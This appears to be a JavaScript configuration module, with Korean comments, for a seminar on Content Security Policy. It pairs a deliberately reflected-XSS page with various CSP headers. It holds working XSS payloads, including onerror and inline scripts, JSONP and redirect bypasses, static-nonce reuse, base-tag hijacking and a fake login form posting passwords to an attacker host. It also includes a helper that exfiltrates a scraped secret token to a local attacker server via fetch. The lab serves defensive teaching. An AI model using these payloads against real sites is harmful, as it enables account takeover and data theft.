// 각 랩 = "같은 취약한 페이지" + "다른 CSP".
// 페이지는 ?q= 값을 이스케이프 없이 그대로 HTML에 박는다 (Reflected XSS).
// 랩마다 바뀌는 것은 오직 응답 헤더의 정책(과 랩에 필요한 우리 코드)뿐이다.

export const ORIGINS = {
  app: "http://localhost:3000",
  cdn: "http://localhost:3001",
  attacker: "http://localhost:4000",
};

const STATIC_NONCE = "c2VtaW5hci1zdGF0aWM="; // "seminar-static" — 고정 nonce 안티패턴 시연용

const steal = (via, value) =>
  `fetch('${ORIGINS.attacker}/steal?via=${via}&c='+encodeURIComponent(${value}),{mode:'no-cors'})`;

export const ATTACKS = {
  inlineHandler: {
    label: "인라인 이벤트 핸들러",
    payload: `<img src=x onerror="lab.pwn('img onerror')">`,
  },
  inlineScript: {
    label: "인라인 <script>",
    payload: `<script>lab.pwn('inline <script>')</script>`,
  },
  externalScript: {
    label: "공격자 서버 스크립트",
    payload: `<script src="${ORIGINS.attacker}/evil.js"></script>`,
  },
  dataScript: {
    label: "data: URL 스크립트",
    payload: `<script src="data:text/javascript,lab.pwn('data: URL script')"></script>`,
  },
  evalGadget: {
    label: "스크립트 가젯 (data-calc 속성)",
    payload: `<span data-calc="lab.pwn('eval gadget: data-calc')"></span>`,
  },
  jsonp: {
    label: "허용된 호스트의 JSONP",
    payload: `<script src="${ORIGINS.cdn}/jsonp?callback=lab.pwn('jsonp on allowlisted host');//"></script>`,
  },
  publicCdnPackage: {
    label: "공개 CDN 에 올라간 아무 패키지",
    payload: `<script src="${ORIGINS.cdn}/npm/totally-legit-utils@1.0.0/index.js"></script>`,
  },
  redirectBypass: {
    label: "허용 경로의 리다이렉트로 JSONP 우회",
    payload: `<script src="${ORIGINS.cdn}/libs/go?to=${encodeURIComponent("/jsonp?callback=lab.pwn('redirect bypass');//")}"></script>`,
  },
  staticNonce: {
    label: "고정 nonce 재사용",
    payload: `<script nonce="${STATIC_NONCE}">lab.pwn('guessed static nonce')</script>`,
  },
  baseHijack: {
    label: "<base> 하이재킹",
    payload: `<base href="${ORIGINS.attacker}/">`,
  },
  formHijack: {
    label: "가짜 로그인 폼",
    payload: `<form action="${ORIGINS.attacker}/phish" method="post" class="phish"><b>세션이 만료되었습니다. 다시 로그인하세요.</b><input name="password" type="password" placeholder="비밀번호"><button>로그인</button></form>`,
  },
};

const uploadAttacks = (query) => {
  const base = query.get("nosniff") === "1" ? "/uploads-nosniff" : "/uploads";
  return [
    { label: "업로드된 notes.txt (text/plain)", payload: `<script src="${base}/notes.txt"></script>` },
    { label: "업로드된 avatar.png (image/png)", payload: `<script src="${base}/avatar.png"></script>` },
    { label: "업로드된 widget.js (text/javascript)", payload: `<script src="${base}/widget.js"></script>` },
  ];
};

const uncoveredAttack = (query) => {
  const cover = query.get("cover") === "1" ? "&cover=1" : "";
  const payload = `<img src=x onerror="fetch('/account').then(r=>r.text()).then(t=>{const s=t.match(/sk-demo-[\\w-]+/)[0];${steal("uncovered-page", "s")};document.body.append('💀 /account 의 비밀값 탈취: '+s)})">`;
  return { href: `/legacy/search?q=${encodeURIComponent(payload)}${cover}`, payload };
};

const flag = (query, name) => query.get(name) === "1";

export const PARTS = [
  {
    id: "part1",
    title: "1부 — XSS · CSP 기본 · 흔한 실패",
  },
  {
    id: "part2",
    title: "2부 — Strict CSP · script-src 밖의 구멍 · Report-Only",
  },
];

export const LABS = [
  // ───────────────────────────── 1부 ─────────────────────────────
  {
    id: "p1-1-no-csp",
    part: "part1",
    title: "1부 Lab 1. CSP 없음",
    summary:
      "브라우저는 HTML에 들어온 스크립트가 '우리 것'인지 '주입된 것'인지 구분하지 못한다. 전부 실행된다.",
    attacks: ["inlineHandler", "inlineScript", "externalScript"],
    policy: () => null,
  },
  {
    id: "p1-2-unsafe-inline",
    part: "part1",
    title: "1부 Lab 2. 'unsafe-inline'",
    summary:
      "외부 도메인은 막았지만 'unsafe-inline' 하나로 XSS 페이로드의 대부분인 인라인 주입이 다시 열린다. 사실상 CSP가 없는 것과 같다.",
    attacks: ["inlineHandler", "inlineScript", "externalScript"],
    policy: () => ({ script: "script-src 'self' 'unsafe-inline'" }),
  },
  {
    id: "p1-3-scheme",
    part: "part1",
    title: "1부 Lab 3. 스킴 소스 — data: · http:",
    summary:
      "'data:' 를 script-src 에 넣으면 공격자가 스크립트 내용을 URL 에 통째로 담아 올 수 있다. 'https:'(로컬 데모에선 'http:')는 '모든 서버' 와 같다 — 공격자도 서버 하나쯤은 있다.",
    toggles: [
      { key: "data", label: "script-src 에 data: 추가" },
      { key: "http", label: "script-src 에 http: 추가 (= 실서비스의 https:)" },
    ],
    attacks: ["dataScript", "externalScript"],
    policy: ({ query }) => ({
      script: `script-src 'self'${flag(query, "data") ? " data:" : ""}${flag(query, "http") ? " http:" : ""}`,
    }),
  },
  {
    id: "p1-4-unsafe-eval",
    part: "part1",
    title: "1부 Lab 4. 'unsafe-eval' 과 스크립트 가젯",
    summary:
      "우리가 쓰는 라이브러리가 data-calc 속성을 new Function 으로 계산한다. 이 라이브러리를 살리려고 'unsafe-eval' 을 열면, 공격자는 <script> 도 이벤트 핸들러도 없이 'data-calc 속성 하나' 로 코드를 실행한다. 'unsafe-inline' 이 없어도.",
    toggles: [{ key: "eval", label: "script-src 에 'unsafe-eval' 추가" }],
    attacks: ["evalGadget", "inlineHandler"],
    policy: ({ query }) => ({ script: `script-src 'self'${flag(query, "eval") ? " 'unsafe-eval'" : ""}` }),
    extraBody: () => `<p class="hint">우리 화면의 계산 필드: 1200 × 3 = <b data-calc="1200 * 3">?</b></p>`,
    legitScriptsAfterContent: ["/static/calc-lib.js"],
  },
  {
    id: "p1-5-allowlist",
    part: "part1",
    title: "1부 Lab 5. 호스트 allowlist — JSONP · 공개 CDN · 리다이렉트",
    summary:
      "인라인과 낯선 도메인은 막힌다. 하지만 '허용한 호스트' 위의 모든 파일을 믿게 된다: JSONP 엔드포인트, 누구나 패키지를 올릴 수 있는 공개 CDN. 경로까지 좁혀도, 그 경로에 리다이렉트가 하나 있으면 브라우저는 리다이렉트 뒤의 경로를 보지 않는다.",
    toggles: [{ key: "path", label: "허용 범위를 /libs/ 경로로 좁히기" }],
    attacks: ["inlineScript", "externalScript", "jsonp", "publicCdnPackage", "redirectBypass"],
    policy: ({ query }) => ({
      script: `script-src 'self' ${ORIGINS.cdn}${flag(query, "path") ? "/libs/" : ""}`,
    }),
  },
  {
    id: "p1-6-self-upload",
    part: "part1",
    title: "1부 Lab 6. 'self' 도 allowlist 다 — 업로드 파일",
    summary:
      "script-src 'self' 는 '우리 origin 의 모든 URL' 을 믿는다. 사용자가 올린 파일도 우리 origin 에서 서빙되면 그 안에 들어간다. 공격자는 파일 세 개를 미리 올려 두었다. X-Content-Type-Options: nosniff 가 없으면 text/plain 파일도 스크립트로 실행된다.",
    toggles: [{ key: "nosniff", label: "업로드 응답에 X-Content-Type-Options: nosniff" }],
    attacks: uploadAttacks,
    policy: () => ({ script: "script-src 'self'" }),
  },
  {
    id: "p1-7-uncovered-page",
    part: "part1",
    title: "1부 Lab 7. CSP 가 빠진 페이지 하나",
    summary:
      "이 페이지와 /account 는 strict 한 정책을 받는다. 하지만 같은 origin 의 /legacy/search 에는 CSP 가 없다. 공격자는 그 페이지에서 XSS 를 일으키고, 같은 origin 권한으로 /account 를 읽어 간다. CSP 는 문서 단위라서, 보호된 페이지의 정책은 다른 페이지에서 일어나는 일을 막지 못한다.",
    toggles: [{ key: "cover", label: "/legacy/search 에도 CSP 적용" }],
    attacks: [],
    uncovered: uncoveredAttack,
    policy: () => ({ script: "script-src 'self'" }),
  },

  // ───────────────────────────── 2부 ─────────────────────────────
  {
    id: "p2-1-nonce",
    part: "part2",
    title: "2부 Lab 1. nonce",
    summary:
      "요청마다 새로 만든 난수(nonce)를 가진 <script>만 실행된다. 공격자는 이번 응답의 nonce를 알 수 없다. 단, nonce가 고정이면(?static=1) 의미가 없다.",
    toggles: [{ key: "static", label: "고정 nonce 사용 (안티패턴)" }],
    attacks: ["inlineHandler", "inlineScript", "externalScript", "jsonp", "staticNonce"],
    nonce: (query) => (flag(query, "static") ? STATIC_NONCE : undefined),
    policy: ({ nonce }) => ({ script: `script-src 'nonce-${nonce}'` }),
    legitInline: true,
  },
  {
    id: "p2-2-strict-dynamic",
    part: "part2",
    title: "2부 Lab 2. 'strict-dynamic'",
    summary:
      "nonce로 신뢰한 스크립트(로더)가 document.createElement로 추가한 스크립트에 신뢰를 전파한다. GA(gtag.js)처럼 스크립트가 스크립트를 부르는 경우에 필요하다. HTML에 직접 주입된 <script src>는 여전히 막힌다.",
    toggles: [{ key: "sd", label: "'strict-dynamic' 추가" }],
    attacks: ["externalScript", "inlineScript"],
    policy: ({ nonce, query }) => ({
      script: `script-src 'nonce-${nonce}'${flag(query, "sd") ? " 'strict-dynamic'" : ""}`,
    }),
    legitScripts: ["/static/loader.js"],
  },
  {
    id: "p2-3-connect-src",
    part: "part2",
    title: "2부 Lab 3. connect-src — 공급망 공격",
    summary:
      "XSS가 아니라 '우리가 nonce를 붙여 실행한 번들' 안의 의존성이 오염된 경우. script-src로는 못 막는다. 대신 데이터를 어디로 보낼 수 있는지(connect-src, img-src)를 제한해 유출을 막는다.",
    toggles: [
      { key: "connect", label: "connect-src 'self'" },
      { key: "default", label: "default-src 'self' (img 비콘까지)" },
    ],
    attacks: [],
    policy: ({ nonce, query }) => ({
      script: `script-src 'nonce-${nonce}' 'strict-dynamic'`,
      extra: [
        flag(query, "default") ? "default-src 'self'" : null,
        flag(query, "connect") ? "connect-src 'self'" : null,
      ],
    }),
    legitScripts: ["/static/app-bundle.js"],
  },
  {
    id: "p2-4-floor",
    part: "part2",
    title: "2부 Lab 4. base-uri · form-action · object-src",
    summary:
      "script-src가 완벽해도 남는 구멍. <base>를 주입하면 우리 nonce 스크립트의 상대경로가 공격자 서버로 바뀐다(nonce가 붙어 있으니 실행됨). <form>을 주입하면 비밀번호가 외부로 전송된다. 스크립트가 아니라서 script-src와 무관하다.",
    toggles: [{ key: "floor", label: "base-uri · form-action · object-src 추가" }],
    attacks: ["baseHijack", "formHijack"],
    policy: ({ nonce, query }) => ({
      script: `script-src 'nonce-${nonce}' 'strict-dynamic'`,
      extra: flag(query, "floor")
        ? ["object-src 'none'", "base-uri 'self'", "form-action 'self'"]
        : [],
    }),
    legitScriptsAfterContent: ["static/widget.js"],
  },
  {
    id: "p2-5-report-only",
    part: "part2",
    title: "2부 Lab 5. Report-Only와 위반 리포트",
    summary:
      "Content-Security-Policy-Report-Only는 막지 않고 위반만 보고한다. 운영 중인 서비스에 바로 enforce를 걸면 분석·모니터링이 소리 없이 죽으므로, 먼저 이 모드로 위반을 모아 본다. /violations 에서 수집된 리포트를 볼 수 있다.",
    toggles: [
      { key: "enforce", label: "enforce로 전환" },
      { key: "jitless", label: "라이브러리 eval 프로브 끄기 (zod jitless)" },
    ],
    attacks: ["inlineHandler", "inlineScript"],
    reportOnly: (query) => !flag(query, "enforce"),
    policy: ({ nonce }) => ({
      script: `script-src 'nonce-${nonce}' 'strict-dynamic'`,
      extra: ["object-src 'none'", "base-uri 'self'", "report-uri /csp-report"],
    }),
    legitScripts: ["/static/schema-lib.js"],
  },
  {
    id: "p2-6-frame-ancestors",
    part: "part2",
    title: "2부 Lab 6. frame-ancestors — 클릭재킹",
    summary:
      "공격자 페이지가 우리 페이지를 투명 iframe으로 덮어 클릭을 훔친다. frame-ancestors는 '누가 나를 iframe에 넣을 수 있나'를 정한다. 스크립트와 무관한, 응답을 받는 쪽이 선언하는 지시어다.",
    toggles: [{ key: "fa", label: "frame-ancestors 'self'" }],
    attacks: [],
    policy: ({ query }) => ({
      script: "script-src 'self'",
      extra: flag(query, "fa") ? ["frame-ancestors 'self'"] : [],
    }),
    clickjack: true,
  },
];

export const CLICKJACK_LAB_ID = "p2-6-frame-ancestors";

export const resolveAttacks = (lab, query) => {
  const entries = typeof lab.attacks === "function" ? lab.attacks(query) : lab.attacks;
  return entries.map((entry) => (typeof entry === "string" ? ATTACKS[entry] : entry));
};

export const buildPolicyHeader = (lab, { nonce, query }) => {
  const parts = lab.policy({ nonce, query });
  if (parts == null) {
    return null;
  }
  const value = [parts.script, ...(parts.extra ?? [])].filter(Boolean).join("; ");
  const reportOnly = lab.reportOnly?.(query) ?? false;
  return {
    name: reportOnly ? "Content-Security-Policy-Report-Only" : "Content-Security-Policy",
    value,
  };
};
